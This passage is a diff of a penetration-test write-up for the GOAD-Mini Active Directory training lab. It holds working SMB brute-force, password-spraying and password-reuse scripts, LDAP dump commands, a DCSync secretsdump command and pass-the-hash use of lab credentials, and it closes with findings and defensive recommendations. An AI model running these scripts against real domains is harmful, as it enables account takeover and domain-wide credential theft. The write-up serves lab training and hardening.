-            VALID_COUNT=$((VALID_COUNT + 
-1
-))
-            
-echo
- 
-"  [+] VALID CREDENTIALS: 
-$user
-:
-$password
-"
- | 
-tee
- -a 
-"
-$RESULTS_FILE
-"
- | 
-tee
- -a 
-"
-$LOG_FILE
-"
-            
-echo
- 
-"      Found at attempt 
-$ATTEMPT_COUNT
-"
- | 
-tee
- -a 
-"
-$LOG_FILE
-"
-        
+done < "$USERS_FILE"
+
+echo ""
+echo "=========================================="
+echo "Brute Force Complete"
+echo "=========================================="
+echo "Total attempts: $ATTEMPT_COUNT"
+echo "Valid credentials found: $VALID_COUNT"
+echo ""
+echo "Results saved to: $RESULTS_FILE"
+echo "Full log: $LOG_FILE"
+echo ""
+
+if [ $VALID_COUNT -gt 0 ]; then
+    echo "Valid credentials:"
+    cat "$RESULTS_FILE"
 else
-            
-# Check for account lockout indicators (optional - may need adjustment)
-            
-# This is a simplified check; real lockout detection is more complex
-            
-echo
- 
-"  [-] Failed: 
-$user
-:
-$password
-"
- >> 
-"
-$LOG_FILE
-"
-        
-fi
-        
-        
-# Delay to avoid lockouts
-        
-sleep
- 
-"
-$DELAY
-"
-        
-    
-done
- < 
-"
-$PASSWORDS_FILE
-"
-    
-    
-echo
- 
-""
- | 
-tee
- -a 
-"
-$LOG_FILE
-"
-    
-done
- < 
-"
-$USERS_FILE
-"
-echo
- 
-""
-echo
- 
-"=========================================="
-echo
- 
-"Brute Force Complete"
-echo
- 
-"=========================================="
-echo
- 
-"Total attempts: 
-$ATTEMPT_COUNT
-"
-echo
- 
-"Valid credentials found: 
-$VALID_COUNT
-"
-echo
- 
-""
-echo
- 
-"Results saved to: 
-$RESULTS_FILE
-"
-echo
- 
-"Full log: 
-$LOG_FILE
-"
-echo
- 
-""
-if
- [ 
-$VALID_COUNT
- -gt 0 ]; 
-then
-    
-echo
- 
-"Valid credentials:"
-    
-cat
- 
-"
-$RESULTS_FILE
-"
-else
-    
-echo
- 
-"No valid credentials found."
+    echo "No valid credentials found."
 fi
 ```
 
@@ -1560,11 +1017,11 @@ fi
 
 - Tests each password from the password file
 
-- Uses`smbclient`to authenticate via SMB
+- Uses `smbclient` to authenticate via SMB
 
 - Also tries LDAP authentication as backup
 
-- Saves valid credentials to`AD_PenTest/results/bruteforce_valid_credentials.txt`
+- Saves valid credentials to `AD_PenTest/results/bruteforce_valid_credentials.txt`
 
 - Includes delays (1 second) to avoid account lockouts
 
@@ -1572,7 +1029,7 @@ fi
 
 ## Using CrackMapExec / NetExec
 
-**Why:**Professional tool, handles lockouts better, faster.
+**Why:** Professional tool, handles lockouts better, faster.
 
 **Installation:**
 
@@ -1617,7 +1074,7 @@ netexec smb 192.168.56.10 \
 
 ## Using Medusa
 
-**Why:**Alternative tool, good for parallel attacks.
+**Why:** Alternative tool, good for parallel attacks.
 
 **Usage:**
 
@@ -1652,7 +1109,7 @@ Why it fails:
 
 ### Using Impacket’s smbclient.py
 
-**Why:**Python-based, good for scripting.
+**Why:** Python-based, good for scripting.
 
 **Usage:**
 
@@ -1661,91 +1118,31 @@ nano smbclient.py
 ```
 
 ```text
-import
- subprocess
-import
- sys
-import
- time
-users_file = 
-"AD_PenTest/results/ad_users_simple.txt"
-passwords_file = 
-"AD_PenTest/wordlists/comprehensive-passwords-clean.txt"
-target = 
-"192.168.56.10"
-with
- 
-open
-(users_file) 
-as
- uf, 
-open
-(passwords_file) 
-as
- pf:
-    users = [line.strip() 
-for
- line 
-in
- uf 
-if
- line.strip()]
-    passwords = [line.strip() 
-for
- line 
-in
- pf 
-if
- line.strip()]
+import subprocess
+import sys
+import time
+
+users_file = "AD_PenTest/results/ad_users_simple.txt"
+passwords_file = "AD_PenTest/wordlists/comprehensive-passwords-clean.txt"
+target = "192.168.56.10"
+
+with open(users_file) as uf, open(passwords_file) as pf:
+    users = [line.strip() for line in uf if line.strip()]
+    passwords = [line.strip() for line in pf if line.strip()]
     
-    
-for
- user 
-in
- users:
-        
-for
- password 
-in
- passwords:
-            cmd = 
-f"smbclient.py sevenkingdoms.local/
-{user}
-:
-{password}
-@
-{target}
- -c 'ls'"
-            result = subprocess.run(cmd, shell=
-True
-, capture_output=
-True
-)
-            
-if
- result.returncode == 
-0
-:
-                
-print
-(
-f"[+] VALID: 
-{user}
-:
-{password}
-"
-)
-                sys.exit(
-0
-)
-            time.sleep(
-1
-)
+    for user in users:
+        for password in passwords:
+            cmd = f"smbclient.py sevenkingdoms.local/{user}:{password}@{target} -c 'ls'"
+            result = subprocess.run(cmd, shell=True, capture_output=True)
+            if result.returncode == 0:
+                print(f"[+] VALID: {user}:{password}")
+                sys.exit(0)
+            time.sleep(1)
 ```
 
 ### Password Spraying (Alternative Approach)
 
-Instead of brute forcing all passwords against all users, you can use**password spraying**:
+Instead of brute forcing all passwords against all users, you can use **password spraying**:
 
 **Strategy:**
 
@@ -1760,9 +1157,7 @@ Instead of brute forcing all passwords against all users, you can use**password 
 Create a small list of most common passwords based on found.
 
 ```text
-cat
- > spray_passwords.txt << 
-EOF
+cat > spray_passwords.txt << EOF
 Password123!
 Password1
 Welcome123
@@ -1774,58 +1169,16 @@ EOF
 Spray against all found users
 
 ```text
-for
- password 
-in
- $(
-cat
- spray_passwords.txt); 
-do
-    
-echo
- 
-"[*] Testing password: 
-$password
-"
-    
-for
- user 
-in
- $(
-cat
- AD_PenTest/results/ad_users_simple.txt); 
-do
-        smbclient -L 192.168.56.10 -U 
-"
-$user
-%
-$password
-"
- -N >/dev/null 2>&1
-        
-if
- [ $? -eq 0 ]; 
-then
-            
-echo
- 
-"[+] VALID: 
-$user
-:
-$password
-"
-        
-fi
-        
-sleep
- 2  
-# Delay to avoid lockouts
-    
-done
-    
-echo
- 
-""
+for password in $(cat spray_passwords.txt); do
+    echo "[*] Testing password: $password"
+    for user in $(cat AD_PenTest/results/ad_users_simple.txt); do
+        smbclient -L 192.168.56.10 -U "$user%$password" -N >/dev/null 2>&1
+        if [ $? -eq 0 ]; then
+            echo "[+] VALID: $user:$password"
+        fi
+        sleep 2  # Delay to avoid lockouts
+    done
+    echo ""
 done
 ```
 
@@ -1833,20 +1186,18 @@ done
 
 ### Windows Default Lockout Policy
 
-- **Lockout threshold:**Usually 5 failed attempts
+- **Lockout threshold:** Usually 5 failed attempts
 
-- **Lockout duration:**Usually 30 minutes
+- **Lockout duration:** Usually 30 minutes
 
-- **Reset counter:**Usually 30 minutes
+- **Reset counter:** Usually 30 minutes
 
 ### Best Practices
 
 - **Use delays:**
 
 ```text
-sleep
- 2  
-# 2 seconds between attempts
+sleep 2  # 2 seconds between attempts
 ```
 
 **2. Monitor for lockouts:**
@@ -1897,7 +1248,7 @@ sleep
 
 Through dictionary brute force and Kerberoasting, we identified valid credentials:
 
-- `Administrator:8dCT-DJjgScp`- Domain administrator account
+- `Administrator:8dCT-DJjgScp` - Domain administrator account
 
 **Analysis:**
 
@@ -1920,55 +1271,15 @@ Once valid credentials were discovered, password reuse testing was performed:
 **Command:**
 
 ```text
-found_password=
-"8dCT-DJjgScp"
-for
- user 
-in
- $(
-cat
- users.txt); 
-do
-  
-if
- [ 
-"
-$user
-"
- != 
-"Administrator"
- ]; 
-then
-    smbclient -L 192.168.56.10 -U 
-"
-$user
-%
-$found_password
-"
- -N >/dev/null 2>&1
-    
-if
- [ $? -eq 0 ]; 
-then
-      
-echo
- 
-"PASSWORD REUSE: 
-$user
-:
-$found_password
-"
- >> password_reuse.txt
-      
-echo
- 
-"✓ Password reuse detected: 
-$user
-"
-    
-fi
-  
-fi
+found_password="8dCT-DJjgScp"
+for user in $(cat users.txt); do
+  if [ "$user" != "Administrator" ]; then
+    smbclient -L 192.168.56.10 -U "$user%$found_password" -N >/dev/null 2>&1
+    if [ $? -eq 0 ]; then
+      echo "PASSWORD REUSE: $user:$found_password" >> password_reuse.txt
+      echo "✓ Password reuse detected: $user"
+    fi
+  fi
 done
 ```
 
@@ -1976,7 +1287,7 @@ done
 
 Password reuse testing was performed across all 27 discovered users. The goal was to identify if the same password was used across multiple accounts, which would enable lateral movement.
 
-**Proof:**Credential testing results documented in`creds/valid_credentials.txt`and`creds/password_reuse.txt`
+**Proof:** Credential testing results documented in `creds/valid_credentials.txt` and `creds/password_reuse.txt`
 
 ## Phase 4.5: Authenticated Active Directory Enumeration
 
@@ -1986,32 +1297,20 @@ With valid credentials obtained in Phase 4, we can now perform comprehensive aut
 
 ## Authenticated LDAP Enumeration
 
-**Tool:**ldapsearch, ldapdomaindump
+**Tool:** ldapsearch, ldapdomaindump
 
-**Method:**Using discovered credentials to perform authenticated LDAP queries.
+**Method:** Using discovered credentials to perform authenticated LDAP queries.
 
 ### User Enumeration
 
 **Command:**
 
 ```text
-ldapsearch -
-x
- -H 
-"ldap://192.168.56.10"
- \
-  -D 
-"Administrator@sevenkingdoms.local"
- \
-  -w 
-"8dCT-DJjgScp"
- \
-  -b 
-"DC=sevenkingdoms,DC=local"
- \
-  
-"(objectClass=user)"
- \
+ldapsearch -x -H "ldap://192.168.56.10" \
+  -D "Administrator@sevenkingdoms.local" \
+  -w "8dCT-DJjgScp" \
+  -b "DC=sevenkingdoms,DC=local" \
+  "(objectClass=user)" \
   sAMAccountName userPrincipalName description
 ```
 
@@ -2034,23 +1333,11 @@ x
 **Command:**
 
 ```text
-ldapsearch -
-x
- -H 
-"ldap://192.168.56.10"
- \
-  -D 
-"Administrator@sevenkingdoms.local"
- \
-  -w 
-"8dCT-DJjgScp"
- \
-  -b 
-"DC=sevenkingdoms,DC=local"
- \
-  
-"(objectClass=group)"
- \
+ldapsearch -x -H "ldap://192.168.56.10" \
+  -D "Administrator@sevenkingdoms.local" \
+  -w "8dCT-DJjgScp" \
+  -b "DC=sevenkingdoms,DC=local" \
+  "(objectClass=group)" \
   cn member memberOf
 ```
 
@@ -2071,23 +1358,11 @@ x
 **Command:**
 
 ```text
-ldapsearch -
-x
- -H 
-"ldap://192.168.56.10"
- \
-  -D 
-"Administrator@sevenkingdoms.local"
- \
-  -w 
-"8dCT-DJjgScp"
- \
-  -b 
-"DC=sevenkingdoms,DC=local"
- \
-  
-"(objectClass=computer)"
- \
+ldapsearch -x -H "ldap://192.168.56.10" \
+  -D "Administrator@sevenkingdoms.local" \
+  -w "8dCT-DJjgScp" \
+  -b "DC=sevenkingdoms,DC=local" \
+  "(objectClass=computer)" \
   name operatingSystem lastLogon
 ```
 
@@ -2108,27 +1383,15 @@ x
 **Command:**
 
 ```text
-ldapsearch -
-x
- -H 
-"ldap://192.168.56.10"
- \
-  -D 
-"Administrator@sevenkingdoms.local"
- \
-  -w 
-"8dCT-DJjgScp"
- \
-  -b 
-"DC=sevenkingdoms,DC=local"
- \
-  
-"(objectClass=organizationalUnit)"
- \
+ldapsearch -x -H "ldap://192.168.56.10" \
+  -D "Administrator@sevenkingdoms.local" \
+  -w "8dCT-DJjgScp" \
+  -b "DC=sevenkingdoms,DC=local" \
+  "(objectClass=organizationalUnit)" \
   ou description
 ```
 
-**Benefit:**Understanding OU structure helps identify:
+**Benefit:** Understanding OU structure helps identify:
 
 - Administrative boundaries
 
@@ -2142,34 +1405,17 @@ x
 
 ## Complete Domain Dump
 
-**Tool:**ldapdomaindump
+**Tool:** ldapdomaindump
 
-**Method:**Performing a comprehensive dump of all AD objects.
+**Method:** Performing a comprehensive dump of all AD objects.
 
 **Command:**
 
 ```text
-ldapdomaindump 
--
-u 
-"SEVENKINGDOMS
-\\
-Administrator"
- \
-  
--
-p 
-"8dCT-DJjgScp"
- \
-  
-192.168
-.
-56.10
- \
-  
--
-o ldap_dump
-/
+ldapdomaindump -u "SEVENKINGDOMS\\Administrator" \
+  -p "8dCT-DJjgScp" \
+  192.168.56.10 \
+  -o ldap_dump/
 ```
 
 **Output Files Generated:**
@@ -2178,55 +1424,41 @@ o ldap_dump
 
 <img src="https://cdn-images-1.medium.com/max/800/1*r9hErGp-5BM-X2xH99kPCA.png" alt="Article image" width="1448" height="92" loading="lazy" decoding="async" />
 
-- `domain_users.json`- All user accounts
+- `domain_users.json` - All user accounts
 
-- `domain_groups.json`- All groups
+- `domain_groups.json` - All groups
 
-- `domain_computers.json`- All computers
+- `domain_computers.json` - All computers
 
-- `domain_ous.json`- Organizational units
+- `domain_ous.json` - Organizational units
 
-- `domain_policy.json`- Password and account policies
+- `domain_policy.json` - Password and account policies
 
 ## Phase 5: Advanced Exploitation
 
 ### DCSync Attack
 
-**Tool:**Impacket secretsdump
+**Tool:** Impacket secretsdump
 
-**Technique:**DCSync is a technique that mimics the behavior of a Domain Controller (DC) to request password data from another DC. This attack requires domain administrator privileges or accounts with specific replication rights.
+**Technique:** DCSync is a technique that mimics the behavior of a Domain Controller (DC) to request password data from another DC. This attack requires domain administrator privileges or accounts with specific replication rights.
 
 **Command:**
 
 ```text
-secretsdump.py -dc-ip 
-192.168
-.
-56.10
- \
-  sevenkingdoms.local/
-Administrator
-:
-8
-dCT-DJjgScp
-@192
-.
-168.56
-.
-10
- \
+secretsdump.py -dc-ip 192.168.56.10 \
+  sevenkingdoms.local/Administrator:8dCT-DJjgScp@192.168.56.10 \
   -just-dc
 ```
 
 **What DCSync Extracts:**
 
-- **NTLM Hashes:**Password hashes for all domain accounts
+- **NTLM Hashes:** Password hashes for all domain accounts
 
-- **LM Hashes:**Legacy password hashes (if enabled)
+- **LM Hashes:** Legacy password hashes (if enabled)
 
-- **Kerberos Keys:**AES keys for Kerberos authentication
+- **Kerberos Keys:** AES keys for Kerberos authentication
 
-- **krbtgt Hash:**The Kerberos ticket-granting ticket account hash
+- **krbtgt Hash:** The Kerberos ticket-granting ticket account hash
 
 **Impact:**
 
@@ -2261,15 +1493,10 @@ With valid credentials, additional enumeration was performed:
 **SMB Share Enumeration:**
 
 ```text
-crackmapexec smb 
-192.168
-.
-56.10
- \
+crackmapexec smb 192.168.56.10 \
   -u Administrator \
   -H c66d72021a2d4744409969a581a1705e \
-  
---shares
+  --shares
 ```
 
 <img src="https://cdn-images-1.medium.com/max/800/1*6LCB2mRr7SIzEGL1McJlXw.png" alt="Article image" width="1672" height="343" loading="lazy" decoding="async" />
@@ -2277,12 +1504,7 @@ crackmapexec smb
 ### RPC User Enumeration:
 
 ```text
-rpcclient -U 
-"Administrator%8dCT-DJjgScp"
- 
-192.168
-.
-56.10
+rpcclient -U "Administrator%8dCT-DJjgScp" 192.168.56.10
 > enumdomusers
 ```
 
@@ -2304,25 +1526,25 @@ rpcclient -U
 
 ### Scope Note
 
-This section documents security weaknesses observed in a**GOAD-Mini training lab**. Several credentials and configurations are intentionally insecure for learning purposes. In a production Active Directory environment, these issues would represent critical security failures.
+This section documents security weaknesses observed in a **GOAD-Mini training lab**. Several credentials and configurations are intentionally insecure for learning purposes. In a production Active Directory environment, these issues would represent critical security failures.
 
 ### Environment Summary (for Findings Context)
 
-- Domain:`sevenkingdoms.local`(SEVENKINGDOMS)
+- Domain: `sevenkingdoms.local` (SEVENKINGDOMS)
 
-- DC:`KINGSLANDING`(`192.168.56.10`)
+- DC: `KINGSLANDING` (`192.168.56.10`)
 
-- Identified principals during enumeration:**26 user accounts**+**1 computer account**(`KINGSLANDING$`) =**27 total principals**
+- Identified principals during enumeration: **26 user accounts** + **1 computer account** (`KINGSLANDING$`) = **27 total principals**
 
 ## Critical Findings
 
 ### F-01: Known / Weak Domain Administrator Credential
 
-**Finding:**The`Administrator`account authenticated successfully using a weak / lab-known password (`8dCT-DJjgScp`).
-**Severity:**Critical
+**Finding:** The `Administrator` account authenticated successfully using a weak / lab-known password (`8dCT-DJjgScp`).
+**Severity:** Critical
 **Impact:**
 
-- Immediate**full domain administrative control**
+- Immediate **full domain administrative control**
 
 - Ability to perform privileged directory operations (e.g., domain-wide credential material extraction)
 
@@ -2330,9 +1552,9 @@ This section documents security weaknesses observed in a**GOAD-Mini training lab
 
 **Evidence (example):**
 
-- Successful authenticated LDAP enumeration as`Administrator`
+- Successful authenticated LDAP enumeration as `Administrator`
 
-- Privileged operations were feasible once`Administrator`credentials were obtained
+- Privileged operations were feasible once `Administrator` credentials were obtained
 
 **Recommendation:**
 
@@ -2344,11 +1566,11 @@ This section documents security weaknesses observed in a**GOAD-Mini training lab
 
 ### F-02: Excessive Privilege Enables Domain-Wide Credential Disclosure
 
-**Finding:**With domain administrator privileges, directory replication-style credential extraction (e.g., domain credential material retrieval) becomes feasible.
-**Severity:**Critical
+**Finding:** With domain administrator privileges, directory replication-style credential extraction (e.g., domain credential material retrieval) becomes feasible.
+**Severity:** Critical
 **Impact:**
 
-- Compromise of**all domain accounts**in a single operation
+- Compromise of **all domain accounts** in a single operation
 
 - Enables long-term compromise paths (e.g., ticket-forging classes of attacks in real-world AD)
 
@@ -2364,8 +1586,8 @@ This section documents security weaknesses observed in a**GOAD-Mini training lab
 
 ### F-03: AS-REP Roastable Accounts (Pre-Auth Disabled)
 
-**Finding:**Accounts`ASREPUser1`and`ASREPUser2`were configured without Kerberos pre-authentication, enabling offline password-guessing against AS-REP material.
-**Severity:**High
+**Finding:** Accounts `ASREPUser1` and `ASREPUser2` were configured without Kerberos pre-authentication, enabling offline password-guessing against AS-REP material.
+**Severity:** High
 **Impact:**
 
 - Username validation plus credential material acquisition without prior authentication
@@ -2376,14 +1598,14 @@ This section documents security weaknesses observed in a**GOAD-Mini training lab
 
 - Ensure Kerberos pre-authentication is enabled for all standard user accounts
 
-- Periodically audit AD for`DONT_REQ_PREAUTH`flag
+- Periodically audit AD for `DONT_REQ_PREAUTH` flag
 
 - Monitor for anomalous Kerberos pre-auth patterns and high-volume AS-REQ activity
 
 ### F-04: Service Accounts Exposed to Kerberoasting + Weak Password Hygiene
 
-**Finding:**SPN-bearing service accounts (`ExchangeService`,`FileService`,`SQLService`,`WebService`) were present and Kerberos service ticket material could be obtained for offline password-guessing. In this lab, multiple service accounts also reused a weak password pattern.
-**Severity:**High
+**Finding:** SPN-bearing service accounts (`ExchangeService`, `FileService`, `SQLService`, `WebService`) were present and Kerberos service ticket material could be obtained for offline password-guessing. In this lab, multiple service accounts also reused a weak password pattern.
+**Severity:** High
 **Impact:**
 
 - Service account takeover
@@ -2394,7 +1616,7 @@ This section documents security weaknesses observed in a**GOAD-Mini training lab
 
 **Recommendation:**
 
-- Prefer**Group Managed Service Accounts (gMSA)**where possible
+- Prefer **Group Managed Service Accounts (gMSA)** where possible
 
 - Enforce long, unique secrets for service accounts and rotate routinely
 
@@ -2406,8 +1628,8 @@ This section documents security weaknesses observed in a**GOAD-Mini training lab
 
 ### F-05: Partial Anonymous SMB Enumeration
 
-**Finding:**Anonymous SMB sessions were partially permitted, allowing limited information disclosure.
-**Severity:**Medium
+**Finding:** Anonymous SMB sessions were partially permitted, allowing limited information disclosure.
+**Severity:** Medium
 **Impact:**
 
 - Increased reconnaissance capability (domain/host metadata, some share visibility depending on configuration)
@@ -2418,14 +1640,14 @@ This section documents security weaknesses observed in a**GOAD-Mini training lab
 
 - Disable anonymous/guest SMB access unless explicitly required
 
-- Validate`Null Session`and guest access settings
+- Validate `Null Session` and guest access settings
 
 - Restrict SMB exposure via firewalling and segmentation
 
 ### F-06: Exposed HTTP Service on Domain Controller
 
-**Finding:**TCP/80 (HTTP) was open on the domain controller, increasing the attack surface.
-**Severity:**Medium
+**Finding:** TCP/80 (HTTP) was open on the domain controller, increasing the attack surface.
+**Severity:** Medium
 **Impact:**
 
 - Additional endpoint to enumerate and potentially exploit if misconfigured
@@ -2444,43 +1666,43 @@ This section documents security weaknesses observed in a**GOAD-Mini training lab
 
 ### P-01: SMB Signing Required
 
-**Observation:**SMB signing was enabled and required.
-**Value:**Reduces risk of SMB relay / certain MITM-style attacks and strengthens SMB integrity guarantees.
+**Observation:** SMB signing was enabled and required.
+**Value:** Reduces risk of SMB relay / certain MITM-style attacks and strengthens SMB integrity guarantees.
 
 ### P-02: Anonymous LDAP Bind Disabled
 
-**Observation:**Anonymous LDAP queries were not allowed.
-**Value:**Prevents unauthenticated directory scraping and reduces exposure of domain object metadata.
+**Observation:** Anonymous LDAP queries were not allowed.
+**Value:** Prevents unauthenticated directory scraping and reduces exposure of domain object metadata.
 
 ## Lessons Learned
 
 ### Attack-Side Takeaways (What Enabled the Compromise)
 
-- **Enumeration drives outcomes:**Early discovery of domain identifiers, services, and user lists directly shaped credential attacks.
+- **Enumeration drives outcomes:** Early discovery of domain identifiers, services, and user lists directly shaped credential attacks.
 
-- **One weak privileged credential collapses defenses:**Even with SMB signing and no anonymous LDAP, a single compromised privileged identity led to full control.
+- **One weak privileged credential collapses defenses:** Even with SMB signing and no anonymous LDAP, a single compromised privileged identity led to full control.
 
-- **Service accounts remain high-value:**SPN-bearing accounts can be leveraged for offline password attacks; weak password hygiene amplifies this risk.
+- **Service accounts remain high-value:** SPN-bearing accounts can be leveraged for offline password attacks; weak password hygiene amplifies this risk.
 
-- **Password reuse is a force multiplier:**Reused patterns (especially across service identities) allow rapid expansion of access.
+- **Password reuse is a force multiplier:** Reused patterns (especially across service identities) allow rapid expansion of access.
 
 ### Defensive Takeaways (What Would Have Helped)
 
-- **Defense-in-depth must include credential controls:**Network-level best practices are insufficient if privileged credentials are weak or exposed.
+- **Defense-in-depth must include credential controls:** Network-level best practices are insufficient if privileged credentials are weak or exposed.
 
-- **Monitoring is practical and effective:**Many AD attack primitives produce detectable Windows security events and Kerberos telemetry.
+- **Monitoring is practical and effective:** Many AD attack primitives produce detectable Windows security events and Kerberos telemetry.
 
-- **Least privilege and role separation matter:**Reducing where admin credentials are used and separating DC roles reduces blast radius.
+- **Least privilege and role separation matter:** Reducing where admin credentials are used and separating DC roles reduces blast radius.
 
 ### Tooling Observations (Operational Effectiveness)
 
-- **Nmap:**Strong for service discovery and environment fingerprinting.
+- **Nmap:** Strong for service discovery and environment fingerprinting.
 
-- **Enum4linux / enum4linux-ng:**Useful for SMB and domain metadata, especially when misconfigurations permit disclosure.
+- **Enum4linux / enum4linux-ng:** Useful for SMB and domain metadata, especially when misconfigurations permit disclosure.
 
-- **Impacket:**Comprehensive AD protocol tooling for both discovery and exploitation paths.
+- **Impacket:** Comprehensive AD protocol tooling for both discovery and exploitation paths.
 
-- **Custom scripts:**Essential for repeatable validation and structured evidence collection in assessments.
+- **Custom scripts:** Essential for repeatable validation and structured evidence collection in assessments.
 
 ## Defensive Recommendations
 
@@ -2488,7 +1710,7 @@ This section documents security weaknesses observed in a**GOAD-Mini training lab
 
 **1) Eliminate Default / Known Credentials**
 
-- Reset`Administrator`and any lab/default accounts
+- Reset `Administrator` and any lab/default accounts
 
 - Reset all service account credentials
 
@@ -2500,13 +1722,13 @@ This section documents security weaknesses observed in a**GOAD-Mini training lab
 
 - Enable pre-authentication on all user accounts unless there is a justified exception
 
-- Audit for`DONT_REQ_PREAUTH`regularly and alert on changes
+- Audit for `DONT_REQ_PREAUTH` regularly and alert on changes
 
 **3) Strengthen Password & Account Policies**
 
 Recommended baseline controls:
 
-- Minimum length:**14+ characters**(higher for privileged/service accounts)
+- Minimum length: **14+ characters** (higher for privileged/service accounts)
 
 - Complexity: required (or use passphrases with strong length)
 
@@ -2520,15 +1742,15 @@ Recommended baseline controls:
 
 **4) Privileged Access Management (PAM)**
 
-- Implement**Just-In-Time (JIT)**privilege elevation for admin tasks
+- Implement **Just-In-Time (JIT)** privilege elevation for admin tasks
 
-- Use**Privileged Access Workstations (PAWs)**for domain administration
+- Use **Privileged Access Workstations (PAWs)** for domain administration
 
 - Reduce membership in high-privilege groups; implement routine access reviews
 
 **5) Service Account Hardening**
 
-- Migrate to**gMSA**where possible
+- Migrate to **gMSA** where possible
 
 - Deny interactive logon for service accounts
 
@@ -2596,9 +1818,9 @@ High-signal detections to implement:
 
 **11) Credential Protections for High-Value Accounts**
 
-- Consider**Protected Users**group for sensitive accounts (with compatibility review)
+- Consider **Protected Users** group for sensitive accounts (with compatibility review)
 
-- Enable**Credential Guard**where supported and operationally feasible
+- Enable **Credential Guard** where supported and operationally feasible
 
 **12) Resilience**
 
@@ -2610,18 +1832,18 @@ High-signal detections to implement:
 
 ## Conclusion
 
-This GOAD-Mini penetration test demonstrated a complete Active Directory attack lifecycle: reconnaissance, service and user enumeration, credential discovery, authenticated domain mapping, and privileged domain-level impact. The decisive failure mode was**credential weakness at the highest privilege tier**, which overcame otherwise reasonable baseline controls such as SMB signing and restricted anonymous LDAP.
+This GOAD-Mini penetration test demonstrated a complete Active Directory attack lifecycle: reconnaissance, service and user enumeration, credential discovery, authenticated domain mapping, and privileged domain-level impact. The decisive failure mode was **credential weakness at the highest privilege tier**, which overcame otherwise reasonable baseline controls such as SMB signing and restricted anonymous LDAP.
 
 ### Key Takeaways
 
-- **Enumeration is decisive:**comprehensive discovery materially increases attack success rate.
+- **Enumeration is decisive:** comprehensive discovery materially increases attack success rate.
 
-- **Privileged credential hygiene is non-negotiable:**one weak admin credential collapses the domain.
+- **Privileged credential hygiene is non-negotiable:** one weak admin credential collapses the domain.
 
-- **Service accounts demand special handling:**SPNs + weak password hygiene enable offline compromise paths.
+- **Service accounts demand special handling:** SPNs + weak password hygiene enable offline compromise paths.
 
-- **Domain-wide credential disclosure is catastrophic:**once privileged access is obtained, impact escalates quickly.
+- **Domain-wide credential disclosure is catastrophic:** once privileged access is obtained, impact escalates quickly.
 
-- **Layered defense must include detection:**many AD attack primitives are observable with proper auditing and centralized logging.
+- **Layered defense must include detection:** many AD attack primitives are observable with proper auditing and centralized logging.
 
 Lab environments like GOAD-Mini remain a high-value platform for building real skills, validating detections, and rehearsing defensive controls safely. Translating these lessons into production requires disciplined identity governance, privilege reduction, robust monitoring, and continuous configuration auditing.
